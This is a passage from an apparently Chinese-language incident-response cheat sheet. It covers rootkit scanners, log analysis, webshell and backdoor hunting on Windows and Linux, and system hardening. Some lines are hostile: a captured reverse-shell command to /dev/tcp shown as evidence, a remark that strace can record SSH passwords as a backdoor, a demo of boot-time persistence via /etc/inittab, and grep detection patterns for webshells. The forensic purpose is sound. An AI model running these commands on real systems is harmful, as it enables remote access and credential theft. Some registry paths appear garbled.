<div class="highlighter-rouge"><pre class="highlight"><code>下载：wget –c ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
编译：tar xvzf chkrootkit.tar.gz
make sense
开始检测：./chkrootkit -q
如果出现INFECTED，说明检测出系统后门
可以直接使用./chkrootkit -q | grep INFECTED命令检测并筛选出存在INFECTED的内容
</code></pre>
</div>

<p>2、Rootkit Hunter</p>

<div class="highlighter-rouge"><pre class="highlight"><code>安装Rootkit Hunter：
tar xvzf rkhunter-xx.tar.gz
cd rkhunter-xx
./install.sh --layout default --install
开始检测：
rkhunter -check
</code></pre>
</div>

<p>3、强大的日志分析工具Log Parser
#分析IIS日志</p>

<div class="highlighter-rouge"><pre class="highlight"><code>LogParser.exe "select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log" -o:datagrid
</code></pre>
</div>

<p>有了这些我们就可以对windows日志进行分析了。</p>

<p>比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>LogParser.exe -i:EVT "SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,'|') AS USERNAME,EXTRACT\_TOKEN(Strings,2,'|') AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,'|') AS Client_IP FROM 'e:\logparser\xx.evtx' WHERE EventID=675"
</code></pre>
</div>

<h4 id="样本分析平台">样本分析平台</h4>

<ul>
  <li>VirusTotal（简称VT，https://www.virustotal.com/）</li>
  <li>国内的微步在线（https://x.threatbook.cn/）</li>
  <li>腾讯的哈勃系统（https://habo.qq.com/）</li>
  <li>金山的火眼（https://fireeye.ijinshan.com/）</li>
  <li>安全易【日志分析】（https://www.anquanyi.com/）</li>
  <li>http://www.virscan.org 多引擎可疑文件扫描</li>
  <li>https://ti.360.net/ 360威胁情报中心</li>
</ul>

<h4 id="日志相关">日志相关</h4>

<p>日志文件位置：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Apache日志位置配置在httpd.conf中。
IIS日志默认存放在%systemroot%\system32\LogFiles\W3SVC目录，如果没有，可以通过配置文件查找，WEB站点—属性—网站—W3C扩展日志文件格式—属性—日志文件目录
apache日志 /usr/local/apache/logs/access_log
weblogic日志 \your_domain\servers\AdminServer\logs\asscee_log
root命令记录 /root/.bash_history
普通用户命令记录：/home/普通用户/.bash_history
/var/log/messages 包括整体系统信息 系统启动期间的日志
/var/log/boot.log 包含系统启动的日志
/var/log/secure SSHD会将所有信息记录（包括失败记录）
/var/log/btmp 记录所有用户的最近信息
/var/log/*
</code></pre>
</div>

<h3 id="应急命令集">应急命令集</h3>

<h4 id="cmd-for-windows">cmd for windows</h4>

<div class="highlighter-rouge"><pre class="highlight"><code>netstat -b -n【查看目前的网络连接情况】
netstat -ano
tasklist | findstr xxx
taskkill /T /F /PID PID号

知道是上传目录，在web log中查看指定时间范围包括上传文件夹的访问请求
findstr /s /m /I "UploadFiles" *.log
某次博彩事件中的六合彩信息是six.js
findstr /s /m /I "six.js" *.aspx
根据shell名关键字去搜索D盘spy相关的文件有哪些
for /r d:\ %i in (*spy*.aspx) do @echo %i

来查看创建时间：
dir /tc 1.aspx

查看用户recent相关文件，通过分析最近打开分析可疑文件

a) C:\Documents and Settings\Administrator\Recent
b) C:\Documents and Settings\Default User\Recent
c) 开始,运行 %UserProfile%\Recent
</code></pre>
</div>

<h4 id="cmd-for-linux">cmd for linux</h4>

<div class="highlighter-rouge"><pre class="highlight"><code>netstat  -antpl
lsof -p PID号
cd /proc/pidnumber
ls -ail
rm –rf /proc/pidnumber/恶意程序

curl ip.cn -H "X-Forwarded-For: x.x.x.x"
ps -ef、lsof -i:8080、netstat -lanp

stat -- 获取比 ls 更多的信息

部分敏感命令：
users:显示当前登陆用户信息。
Who:显示谁正在使用系统本地节点的信息。
Last:显示系统曾经被登陆的用户和TTYS。
w:查看谁登陆到系统中，且在做什么操作。 
netstat -anp:查看端口对应的进程关系。
lsof -p PID:查看进程对应的文件，配合netstat -anp查看端口进程文件之间的关系，可以找到可以端口进程对应的文件。
lsof -i:查看实时的进程、服务与端口信息。
ps -aux:查看进程。
chkconfig -list:查看服务启动信息。
find / -perm -004000 -type f:输出所有设置了SUID的文件。
rpm -Va:列举全部软件包的变化情况。


lsof命令用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。
lsof -i:8080【进程号】

【ls实现列文件按时间排序】
1) ls -lt  时间最近的在前面
2) ls -ltr 时间从前到后
3) 利用sort
ls -l | sort +7 (日期为第8列)  时间从前到后
ls -l | sort -r +7 时间最近的在前面

【Strace动态调试】
strace -p PID

strace -o aa -ff -p ssh进程
grep open aa* | grep -v -e No -e null -e denied| grep WR
grep一下open系统调用，然后过滤掉错误信息和/dev/null信息，以及denied信息，并且找WR的
另外，这玩意儿可以当后门记录密码
---------------

查找shell：
find /var/www/html/ -type f -name "*.jsp" | xargs grep "exec("
find /site/* -type f -name "*.php" |xargs grep "eval(" 　
find /site/* -type f -name "*.asp" |xargs grep "execute("
find /site/* -type f -name "*.aspx" |xargs grep "eval("
如果木马做了免杀处理，可以查看是否使用加密函数
find /site/* -type f -name "*.php" |xargs grep "base64_decode"
find /site/* -type f -name "*.php" |xargs grep "@$"

新增文件分析
例如要查找24小时内被修改的JSP文件： 
find ./ -mtime 0 -name "*.jsp"
（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）

查找72小时内新增的文件find / -ctime -2
PS：-ctime 内容未改变权限改变时候也可以查出
根据确定时间去反推变更的文件
ls -al /tmp | grep "Feb 27"

特殊权限的文件
查找777的权限的文件 find / *.jsp -perm 4777
---------------

查看可疑账号：

查看UID为0的帐号：awk -F: '{if($3==0)print $1}' /etc/passwd
查看能够登录的帐号：cat /etc/passwd | grep -E "/bin/bash$"
PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）

-----------------

查找日志：
1、注入漏洞记录
grep -i select%20 *.log  | grep 500 | grep -i \.php 
查找后缀为".log"文件，搜索关键字为"select%20",筛选存在"500"的行
grep -i sqlmap *.log
sqlmap默认User-Agent是sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)，查看存在sqlmap的行，可以发现sqlmap拖库的痕迹。

2、跨站漏洞记录
grep -i "script" *.log 查找存在script的行。

3、扫描器扫描
grep -i acunetix *.log AWVS扫描时，会发送大量含有"acunetix"的数据包

4、搜索特定时间的日志
grep \[07/Jul/2016:24:00:* *.log 可以结合入侵时间搜索，文件修改时间不可作为依据，菜刀上就可以修改文件时间属性。

5、搜索特定IP地址的日志
grep ^192.168.1.* *.log 搜索包含"192.168.1."字符串开头的行 
grep -v ^192.168.10.* *.log 不搜索包含"192.168.10."字符串开头的行 
可以结合网站、网络安全策略搜索能访问网站后台、FTP服务等的IP地址。
查看ip访问次数：
cat access.log | awk '{print $1}' | sort | uniq -c
cat /var/log/secure |grep ACCEPTED 查看ssh进入的ip

页面访问排名前十的IP
cat access.log | cut -f1 -d " " | sort | uniq -c | sort -k 1 -r | head -10
页面访问排名前十的URL
cat access.log | cut -f4 -d " " | sort | uniq -c | sort -k 1 -r | head -10
查看最耗时的页面
cat access.log | sort -k 2 -n -r | head 10
---------------

查看所有用户的定时任务：
for u in `cat /etc/passwd | cut -d":" -f1`;do crontab -l -u $u;done

netstat –tlp –ano | grep 'ip'



敏感文件：
/var/log/messages:记录整体系统信息，其中也记录某个用户切换到root权限的日志。 
/var/log/secure:记录验证和授权方面信息。例如sshd会将所有信息记录（其中包括失败登录）在这里。
/var/log/lastlog:记录所有用户的最近信息。二进制文件，因此需要用lastlog命令查看内容。
/var/log/btmp:记录所有失败登录信息。使用last命令可查看btmp文件。例如"last -f /var/log/btmp | more"。
/var/log/maillog:记录来着系统运行电子邮件服务器的日志信息。例如sendmail日志信息就送到这个文件中。
/var/log/mail/:记录包含邮件服务器的额外日志。
/var/log/wtmp或/var/log/utmp:记录登录信息。二进制文件，须用last来读取内容;
/etc/passwd:记录用户信息，查看是否存在可疑账号。
/etc/shadow:记录用户密码，查看是否存在可疑账号。
.bash_history:shell日志，查看之前使用过的命令。
/var/log/cron:记录计划任务。


grep evil_ip /var/log/secure*【查看last记录里的可疑ip】
grep "Accept" /var/log/secure* | awk '{print $11}' | sort | uniq【查看所有登录成功的ip】

检查常用命令是否被替换：
[root[@ceshi1](/user/ceshi1) log]# ls -alt /bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/bin/ | head -n 10
[root[@ceshi1](/user/ceshi1) log]# ls -alt /usr/sbin/ | head -n 10

查看.sshd里面的ip：
strings /usr/bin/.sshd | egrep '[1-9]{1,3}\.[1-9]{1,3}\.'

发现可疑进程，查看所在途径【随时准备拷贝自用的bin文件，比如ps】：
netstat -antlp
ps axu | grep xxx| grep -v grep

pstree -p【感觉完全没有win下叼啊】

查看一些临时目录

例如要查找24小时内被修改的JSP文件：
find ./ -mtime 0 -name "*.jsp"

find ./ -mtime 2
搜索是的48~72小时内修改的文件。

find . –mtime +n:
最后一次修改发生在n+1天以前，距离当前时间为(n+1)*24小时或者更早

find . –mtime –n:
最后一次修改发生在n天以内，距离当前时间为n*24小时以内

查找24小时内被修改的JSP文件也可以用：
find ./ -mtime -1 -name "*.jsp"

--------------
echo $PATH 分析有无敏感可疑信息
a) strings命令在对象文件或二进制文件中查找可打印的字符串
b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'
PS：此正则不严谨，但匹配IP已够用
c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）
查看ssh相关目录有无可疑的公钥存在。
a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。
b) 目录： /etc/ssh ./.ssh/
--------------------------



查看访问控制文件权限：
setfacl与getfacl

lsattr和chattr
修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录
例子：设置/etc/resolv.conf为不可修改
[root@vincent tmp]# chattr +i /etc/resolv.conf 
[root@vincent tmp]# lsattr /etc/resolv.conf 
----i--------e- /etc/resolv.conf
[root@vincent tmp]# echo "" &gt; /etc/resolv.conf 
-bash: /etc/resolv.conf: 权限不够
lsattr
查看文件权限
[root@vincent tmp]# lsattr 1.txt 
-----a-------e- 1.txt


【获取反弹bash】
netstat -antlp | grep EST | grep bash
【检查在监听的端口】
netstat -antlp | grep LISTEN

【查找敏感目录/tmp, /var/tmp, /dev/shm】
# ls -ald xxx

默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。
之前写的关于Bash审计方式也很推荐。从Bash4.1 版本开始，Bash开始支持Rsyslog.

find ./ -mtime 0 -name "*.jsp" 【找webshell】
diff -r {生产dir} {测试dir}



启动项排查：
【总结一下，针对CentOS5系统，需要排查的点】：
1）/etc/inittab
该文件是可以运行process的，这里我们添加一行
&gt; 0:235:once:/bin/vinc
内容如下
[root@localhost ~]# cat /bin/vinc 
#!/bin/bash
cat /etc/issue &gt; /tmp/version
重启
[root@localhost ~]# cat /tmp/version 
CentOS release 5.5 (Final)
Kernel \r on an \m
2）/etc/rc.d/rc.sysinit
在最后插入一行/bin/vinc
[root@localhost ~]# ll /tmp/version 
-rw-r--r-- 1 root root 47 11-05 10:10 /tmp/version
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local
【总结一下，针对CentOS6系统，需要排查的点】：
1）/etc/init/*.conf
vim tty.conf，添加一行
&gt; exec /bin/vinc
内容如下:
[root@vincenthostname init]# cat /bin/vinc 
#!/bin/bash

touch /tmp/vinc
重启
[root@vincenthostname ~]# ll /tmp/vinc
-rw-r--r-- 1 root root 0 6月  22 15:07 /tmp/vinc
2）/etc/rc.d/rc.sysinit
3）/etc/rc.d/init.d
4）/etc/rc.d/rc.local

定时部分：
应急响应中关于定时任务应该排查的/etc/crontab,/etc/cron.d,/var/spool/cron/{user},然后顺藤摸瓜去看其他调用的目录/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly，/etc/anacrontab 。
其中容易忽视的就是/etc/anacrontab

这里就需要介绍一些/usr/sbin/anacron，anacron是干什么的？
anacron主要在处理非 24 小时一直启动的 Linux 系统的 crontab 的运行。

ll /var/spool/cron/*
------------

检查命令替换部分：
1）系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查。
例如我替换一下/bin/ps，然后使用rpm -qaV查看
[root@vincenthostname tmp]# rpm -qa /bin/ps
2）比对命令的大小
例如正常的ps和netstat大小
[root@vincent tmp]# ll /bin/ps
-rwxr-xr-x 1 root root 87112 11月 15 2012 /bin/ps
[root@vincent tmp]# ll /bin/netstat
-rwxr-xr-x 1 root root 128216 5月 10 2012 /bin/netstat
下面是其中有一次应急时的记录
[root@DataNode110 admin]# ls -alt /bin/ | head -n 10
total 10836
-rwxr-xr-x 1 root root 625633 Aug 17 16:26 tawlqkazpu
dr-xr-xr-x. 2 root root 4096 Aug 17 16:26 .
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 ps
-rwxr-xr-x 1 root root 1223123 Aug 17 11:30 netstat
可以看到ps和netstat是一样大的。
3）查看命令的修改时间，按修改时间排序
ls -alt /bin/ | head -n 5
4）使用chkrootkit和rkhunter查看
chkrootkit
1、准备gcc编译环境
对于CentOS系统，执行下述三条命令：
&gt; yum -y install gcc gcc-c++ make glibc*
2、下载chkrootkit源码
chkrootkit的官方网站为 http://www.chkrootkit.org ，下述下载地址为官方地址。为了安全起见，务必在官方下载此程序：
&gt; [root@www ~]# wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
3、解压下载回来的安装包
&gt; [root@www ~]# tar zxf chkrootkit.tar.gz
4、编译安装（后文命令中出现的"*"无需替换成具体字符，原样复制执行即可）
&gt;[root@www ~]# cd chkrootkit-*
&gt;
&gt;[root@www ~]# make sense
注意，上面的编译命令为make sense。
5、把编译好的文件部署到/usr/local/目录中，并删除遗留的文件
&gt;[root@www ~]# cd ..
&gt;[root@www ~]# cp -r chkrootkit- /usr/local/chkrootkit
&gt;[root@www ~]# rm -r chkrootkit-
至此，安装完毕。
使用方法
安装好的chkrootkit程序位于 /usr/local/chkrootkit/chkrootkit
直接执行
&gt; root@vm:~# /usr/local/chkrootkit/chkrootkit
rkhunter
在安装了kbeast的系统上测试，发现检测效果不如rkhunter好。
下载地址： http://sourceforge.net/projects/rkhunter/files/
1）安装
tar -xvf rkhunter-1.4.0.tar.gz
cd rkhunter-1.4.0
./installer.sh –install
在安装了kbeast的系统上测试，可以成功检测到。
/usr/local/bin/rkhunter –check -sk
[19:50:27] Rootkit checks…
[19:50:27] Rootkits checked : 389
[19:50:27] Possible rootkits: 1
[19:50:27] Rootkit names : KBeast Rootkit
2）在线升级
rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:
执行命令：
&gt; rkhunter –update
3）检测最新版本
让 rkhunter 保持在最新的版本；
执行命令：
&gt; rkhunter –versioncheck


【创建Audit审计规则】
vim /etc/audit/audit.rules
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b64 -F uid=48 -S execve -k webshell

【编写测试Java命令监控规则，Jboss的启动账户为nobody，添加审计规则】
# grep '\-a' /etc/audit/audit.rules 
-a exclude,always -F msgtype=CONFIG_CHANGE
-a exit,always -F arch=b32 -F uid=99 -S execve -k webshell
【重启服务】
# service auditd restart
Stopping auditd: [ OK ]
Starting auditd: [ OK ]

查看恶意ip试图登录次数：
lastb | awk '{ print $3}'  | sort | uniq -c | sort -n

SSH部分：
【查看登录成功信息】
grep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者last命令，它会读取位于/var/log/wtmp的文件

【查看登录失败信息】
grep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者lastb命令，会读取位于/var/log/btmp的文件

【查看ssh配置文件和/usr/sbin/sshd的时间】
stat /usr/sbin/sshd

【通过strace监控sshd进程读写（密码）文件的操作】
# ps axu | grep sshd | grep -v grep
root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd
# strace -o aa -ff -p 65530
# grep open aa* | grep -v -e No -e null -e denied| grep WR
aa.102586:open("/tmp/ilog", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4

进程部分：
【资源占用】
top
【启动时间】
可疑与前面找到的Webshell时间点比对。
【启动权限】
这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：
mysql 63763 45.3 0.0 12284 9616 ? R 01:18 470:54 ./db_temp/dazui.4
mysql 63765 0.0 0.0 12284 9616 ? S 01:18 0:01 ./db_temp/dazui.4
mysql 63766 0.0 0.0 12284 9616 ? S 01:18 0:37 ./db_temp/dazui.4
mysql 64100 45.2 0.0 12284 9616 ? R 01:20 469:07 ./db_temp/dazui.4
mysql 64101 0.0 0.0 12284 9616 ? S 01:20 0:01 ./db_temp/dazui.4
那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。
【父进程】
例如我在菜刀中反弹Bash
[root@server120 html]# ps -ef | grep '/dev/tcp' | grep -v grep
apache 26641 1014 0 14:59 ? 00:00:00 sh -c /bin/sh -c "cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &gt;&amp; /dev/tcp/192.168.192.144/2345 0&gt;&amp;1;echo [S];pwd;echo [E]" 2&gt;&amp;1
父进程进程号1014
[root@server120 html]# ps -ef | grep 1014
apache 1014 1011 0 Sep19 ? 00:00:00 /usr/sbin/httpd
可以看到父进程为apache，就可以判断攻击者通过Web入侵。
获取到可疑进程号之后，可疑使用lsof -p pid查看相关文件和路径。
例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称
udp 0 0 0.0.0.0:49937 0.0.0.0:* 131683/ls -la 
udp 0 0 0.0.0.0:47584 0.0.0.0:* 116515/ifconfig
使用lsof -p pid可以看到可执行文件
[root@DataNode105 admin]# lsof -p 131683
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
hahidjqzx 131683 root cwd DIR 8,98 4096 18087937 /root
hahidjqzx 131683 root rtd DIR 8,98 4096 2 /
hahidjqzx 131683 root txt REG 8,98 625622 24123895 /usr/bin/hahidjqzxs
【获取文件类型】
可以文件类型可以使用file获取；


awk '{print $1}' access.log |sort|uniq -c|sort -nr|head -10【获取频率前10的ip】
netstat -nat | grep "192.168.1.15:1234" |awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -20【查看连接某服务端口最多的的IP地址】


</code></pre>
</div>

<h4 id="安全加固">安全加固</h4>

<h5 id="常规应急处理">常规应急处理</h5>

<p>杀死进程，kill -9 xxx
删除木马，拷贝正常命令【或者找原来的备份】，删除开机启动项。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
rm: cannot remove `abcfg': Operation not permitted
[root[@ceshi1](/user/ceshi1) tomcat]# lsattr abcfg
----i--------e- abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# chattr -i abcfg
[root[@ceshi1](/user/ceshi1) tomcat]# rm -f abcfg
--------------------
</code></pre>
</div>

<p>屏蔽IP</p>

<div class="highlighter-rouge"><pre class="highlight"><code>iptables -A INPUT -i eth0 -s *.*.*.0/24 -j DROP
</code></pre>
</div>

<h5 id="windows系统篇">WINDOWS系统篇</h5>

<div class="highlighter-rouge"><pre class="highlight"><code>1.1.1 禁用/停止服务
C:&gt; sc query
C:&gt; sc config "服务名" start= disabled
C:&gt; sc stop "服务名"
C:&gt; wmic service where name="服务名" call ChangeStartmode Disabled
1.1.2 防火墙管理
列出所有规则:
C:&gt; netsh advfirewall firewall show rule name=all
启用或禁用防火墙:
C:&gt; netsh advfirewall set currentprofile state on
C:&gt; netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound
C:&gt; netsh advfirewall set publicprofile state on
C:&gt; netsh advfirewall set privateprofile state on
C:&gt; netsh advfirewall set domainprofile state on
C:&gt; netsh advfirewall set allprofile state on
C:&gt; netsh advfirewall set allprof ile state off
配置举例：
netsh advfirewall firewall add rule name="开放TCP:80端口" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="开放TCP:443端口" dir=in action=allow protocol=TCP localport=443
netsh advfirewall firewall add rule name="屏蔽TCP:445端口" dir=in action=block protocol=TCP localport=445
netsh advfirewall firewall add rule name="允许MyApp" dir=in action=allow program="C:MyAppMyApp.exe" enable=yes
1.1.3 清除DNS缓存和Netios缓存
C:&gt; ipconfig /flushdns
C:&gt; nbtstat -R
1.1.4 应用控制
AppLocker配置
导入Applocker模块
PS C:&gt; import-module Applocker
查看system32目录下所有exe文件的Applocker信息
PS C:&gt; Get-ApplockerFileinformation -Directory C:WindowsSystem32 -Recurse -FileType Exe
 增加一条针对system32目录下所有的exe文件的允许规则
PS C:&gt; Get-Childitem C:WindowsSystem32*,exe | Get-ApplockerFileinformation | New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32
1.1.5 IPSEC
1.）使用预共享密钥的方式新建一条IPSEC本地安全策略，应用到所有连接和协议
C:&gt; netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY
C:&gt; netsh ipsec static add filteraction name=MyIPsecAction action=negotiate 
C:&gt; netsh ipsec static add policy name=MyIPsecPolicy assign=yes
C:&gt; netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all  activate=yes psk=密码
2.）新建一条允许访问外网TCP 80和443端口的IPSEC策略
C:&gt; netsh ipsec static add filteraction name=Allow action=permit
C:&gt; netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80
C:&gt; netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443
C:&gt; netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=密码
3.）查看和禁用某条IPSEC本地安全策略
C:&gt; netsh ipsec static show policy name=MyIPsecPolicy
C:&gt; netsh ipsec static set policy name=MyIPsecPolicy assign=no
新建一条IPSEC对应的防火墙规则，源地址和目的地址为any
C:&gt; netsh advfirewall consec add rule name="IPSEC" endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default
新建一条IPSEC对应的防火墙规则，所有出站请求必须提供预共享密钥
C:&gt; netsh advfirewall firewall add rule name="IPSEC_Out" dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any  interfacetype=any security=authenticate
1.1.6 其他安全策略
禁用远程桌面连接
C:&gt; reg add "HKLMSYSTEMCurrentControlSetControlTerminalServer" /f /v fDenyTSConnections /t REG_DWORD /d 1
只发送NTLMv2响应（防止"永恒之蓝"漏洞攻击）
C:&gt; reg add HKLMSYSTEMCurrentControlSetControlLsa /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
禁用IPV6
C:&gt; reg add HKLMSYSTEMCurrentControlSetservicesTCPIP6Parameters /v DisabledComponents /t REG_DWORD /d 255 /f
禁用sticky键
C:&gt; reg add "HKCUControlPanelAccessibilityStickyKeys" /v Flags /t REG_SZ /d 506 /f
禁用管理共享（Servers/Workstations）
C:&gt; reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareServer /t REG_DWORD /d 0
C:&gt; reg add HKLMSYSTEMCurrentControlSetServicesLanmanServerParameters /f /v AutoShareWks /t REG_DWORD /d 0
禁用注册表编辑器和CMD命令提示符
C:&gt; reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegistryTools /t REG_DWORD /d 1 /f
C:&gt; reg add HKCUSoftwarePoliciesMicrosoftWindowsSystem /v DisableCMD /t REG_DWORD /d 1 /f
启用UAC
C:&gt; reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem /v EnableLUA /t REG_DWORD /d 1 /f
启用防火墙日志
C:&gt; netsh firewall set logging droppedpackets = enable 
C:&gt; netsh firewall set logging connections = enable
</code></pre>
</div>

<h5 id="linux系统篇">LINUX系统篇</h5>

<div class="highlighter-rouge"><pre class="highlight"><code>1.2.1 服务管理
查看服务状态
service --status-all
ps -ef OR ps -aux
initctl list
systemctl list-unit-files
启动，停止和禁用服务
For Upstart services:
/etc/init.d/apache2 start | stop | status
service apache2 start | stop | status
update-rc.d apache2 disable
For Systemd services:
systemctl start | stop | status ntp.service
systemctl disable sshd.service
1.2.2 防火墙管理
iptables 常用操作：
iptables-save &gt; filewall_rules.bak # 导出当前规则
iptables -vnL --line # 列出所有规则
iptables -S # 同上
iptables -P INPUT DROP # 默认策略，禁止所有连接
iptables -A INPUT -s 10.10.10.10 -j DROP # 禁止单个IP
iptables -A INPUT -s 10,10.10.0/24 -j DROP # 禁止一个网段
iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP # 禁止某IP访问本机SSH服务
iptables -A INPUT -p tcp --dport ssh -j DROP # 禁止访问本机SSH服务
iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix "
iptables denied: " --log-level 7 # 启用日志
iptables -F # 清除所有已加载的工作
1.2.3 DNS缓存
Unix/Linux系统没有系统级别DNS缓存
1.2.4 配置IPSEC
在两台服务器之间建立IPSEC通道
1.）添加防火墙规则允许IPSEC协议
iptables -A INPUT -p esp -j ACCEPT
iptables -A INPUT -p ah -j ACCEPT
iptables -A INPUT -p udp --dport 500 -j ACCEPT
iptables -A INPUT -p udp --dport 4500 -j ACCEPT
安装Racoon
apt -y install racoon
2.）编辑配置文件：/etc/ipsec-tools.conf
flush;
spdflush;
spdadd 主机A的IP地址 主机B的IP地址 any -P out ipsec
 esp/transport//require;
spdadd 主机B的IP地址 主机A的IP地址 any -P in ipsec
 esp/transport//require;
3.）编辑配置文件：/etc/racoon/racoon.conf
log notify;
path pre_shared_key "/etc/racoon/psk.txt";
path certificate "/etc/racoon/certs";
remote anonymous {
 exchange_mode main,aggressive;proposal {    encryption_algorithm aes_256;    hash_algorithm sha256;    authentication_method
pre_shared_key;
     dh_group modp1024;
}
 generate_policy off;
}
sainfo anonymous{
 pfs_group 2;encryption_algorithm aes_256;authentication_algorithm hmac_sha256;compression_algorithm deflate;
}   
4.）添加预共享密钥
主机A：echo 主机B 123 &gt;&gt; /etc/racoon/psk.txt
主机B：echo 主机A 123 &gt;&gt; /etc/racoon/psk.txt
5.）重启服务，检查协商及配置策略
service setkey restart
setkey -D
setkey -DP
</code></pre>
</div>

<h4 id="给目录和容器改权限">给目录和容器改权限</h4>

<p><a href="https://www.cnblogs.com/yuanqiao/p/4816843.html">apache禁止访问文件或目录执行权限、禁止运行脚本PHP文件的设置方法</a></p>

<p><a href="https://blog.csdn.net/anxinliu2011/article/details/">Tomcat用户权限设置</a></p>

<p>在ubuntu 安装完apache 之后，默认会往系统中增加www-data 用户 和 www-data 用户组。
同样你可以用 ps -ef | grep apache 查看 apache 进程，你会发现apache的。</p>

<p>这样你就可以理解为这个apache服务器运行的用户和用户组是www-data,假设网站的用户为demo,项目的目录为/var/www/html/demo</p>

<p>接下来就分几个步骤来设置(用root用户执行下面的命令)：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>1.首先把网站的的目录和文件的所有者设置为demo,所属组设置为www-data ，对与Linux命令不熟悉的，可以到网上查询。

chown -R demo:www-data /var/www/html/demo
2.设置网站目录权限为750，750是demo这个用户对目录拥有读写执行的权限，这样demo用户可以在任何目录下创建文件，用户组有有读执行权限，这样就有进入目录的权限，其它用户没有任何权限。

chmod 750 /var/www/html/demo
cd  /var/www/html/demo
find -type d -exec chmod 750 {} \;
3.设置网站文件权限为640，640指只有demo用户对网站文件有更改的权限，apache服务器只有读取文件的权限，无法更改文件，其它用户无任何权限。

find -not -type d -exec chmod 640 {} \;
4.需要针对个别目录来设置权限，以Thinkphp为例，它的Runtime 目录存储的有日志文件，还有与数据库做ORM映射的数据库表信息，这说明apache服务器要对这些目录

有访问的权限，并且对于线面的日志文件有写入的权限，那么这样就需要对于这些特殊目录设置。

cd /var/www/html/demo
find . -name "Runtime" -type d -exec chmod -R 770 {} \;
执行上面的命令请注意 “{}”与 “\”之间是有空格的，上面的-R参数是递归给Runtime 目录下面的目录和文件赋予 770 权限，当然了你会说日志文件是不需要执行权限的，

不过这里没关系，当你把日志文件删除掉之后，生成出来的文件是没执行权限的。因为当你把日志文件删除掉之后，那么生成日志文件的的用户和所有者都是www-data。

这样整个站点你就可以通过这种方式管理起来了。
</code></pre>
</div>

<h4 id="简单的抓包命令">简单的抓包命令</h4>

<p>抓取所有经过 eth2 目的或源地址是 192.168.1.2 的网络数据 ，并且保存到XX.pcap文件中</p>
<div class="highlighter-rouge"><pre class="highlight"><code>tcpdump   -i  eth2 host 192.168.1.2    -w   xx.pcap
</code></pre>
</div>

<p>抓取所有经过 eth2，目的地址是 192.168.1.2 的网络数据，并且保存到XX.pcap文件中</p>
<div class="highlighter-rouge"><pre class="highlight"><code>tcpdump   -i  eth2  dst host 192.168.1.2    -w   xx.pcap
</code></pre>
</div>

